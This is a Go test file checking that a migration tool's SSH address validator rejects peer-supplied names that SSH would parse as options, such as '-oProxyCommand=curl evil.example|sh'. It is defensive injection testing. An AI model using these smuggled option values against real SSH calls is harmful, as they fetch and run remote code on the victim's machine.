package migrate

import (
	"context"
	"errors"
	"testing"
)

// Peers choose their own names, and this one is not typed by the person
// running the move: it arrives in another machine's Tailscale status.
func TestAddressesSSHWouldReadAsOptionsAreRefused(t *testing.T) {
	for _, addr := range []string{
		"-oProxyCommand=curl evil.example|sh",
		"-obatchmode=no",
		"--",
		"host name",
		"host\tname",
		"host\nname",
		"",
	} {
		if err := checkAddr(addr); err == nil {
			t.Errorf("checkAddr(%q) allowed it", addr)
		} else if !errors.Is(err, ErrBadAddress) {
			t.Errorf("checkAddr(%q) = %v, want ErrBadAddress", addr, err)
		}
	}
}

func TestOrdinaryAddressesAreAllowed(t *testing.T) {
	for _, addr := range []string{"laptop", "laptop.tail1234.ts.net", "100.64.0.1", "fd7a::1", "my-nas.local"} {
		if err := checkAddr(addr); err != nil {
			t.Errorf("checkAddr(%q) = %v, want nil", addr, err)
		}
	}
}

// And the check is on the path that actually builds the argv.
func TestRunRefusesAnAddressItCannotPass(t *testing.T) {
	s := &SSH{bin: "ssh"}
	if _, err := s.Run(context.Background(), Target{Addr: "-oProxyCommand=id"}, "true", nil, nil); !errors.Is(err, ErrBadAddress) {
		t.Errorf("Run with a dashed address returned %v, want ErrBadAddress", err)
	}
}
